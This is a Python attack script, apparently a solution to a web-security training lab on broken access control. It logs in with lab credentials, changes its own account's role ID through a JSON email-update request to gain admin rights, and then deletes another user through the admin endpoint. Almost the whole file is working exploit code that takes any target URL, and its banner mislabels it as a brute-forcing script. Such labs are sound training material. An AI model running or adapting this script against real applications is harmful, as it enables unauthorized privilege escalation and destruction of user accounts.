import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner():
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('broken access',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def CheckTheResulte(r,text,text2,condition,j):
    
    if j==0:
        if condition in r.text:
            print(colored(text,'green'))
        else:
            print(colored(text2,'red'))
            sys.exit(-1)
    else:
        if condition not in r.text:
            print(colored(text,'green'))
        else:
            print(colored(text2,'red'))
            sys.exit(-1)





def post_method(s,url,DATA,path,i):
    try:
        if i == 0:
            r = s.post(url+path, data=DATA, verify=False, proxies=proxies)
            return r
        else:
            r = s.post(url+path, json=DATA, verify=False, proxies=proxies)
            return r
    except Exception as e:
        print(colored(e,'red'))


def delete_user(s, url):
    # login as the wiener user
    path =  "/login"
    data_login = {"username": "wiener", "password": "peter"}
    r=post_method(s,url=url,DATA=data_login,path=path,i=0)

    CheckTheResulte(r,text='(+) Successfully logged in as the wiener user.',text2='(-) Could not login as the wiener user.',condition='Log out',j=0)

    # Change the role id of the user
    path =  "/my-account/change-email"
    data_role_change = {"email":"test@test.ca", "roleid": 2}
    r=post_method(s,url=url,DATA=data_role_change,path=path,i=1)

    CheckTheResulte(r=r,text='(+) Successfully changed the role id.',text2='(-) Could not change the role id.',condition='Admin',j=0)
    

    # Delete the Carlos user
    path = "/admin/delete?username=carlos"
    r = s.get(url+path, verify=False, proxies=proxies)
    
    CheckTheResulte(r=r,text='(+) Successfully delete Carlos user',text2='(-) Could not delete Carlos user.',condition='carlos',j=1)




def main():
    banner()
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    delete_user(s,url=url)
   


    

if __name__ == "__main__":
    main()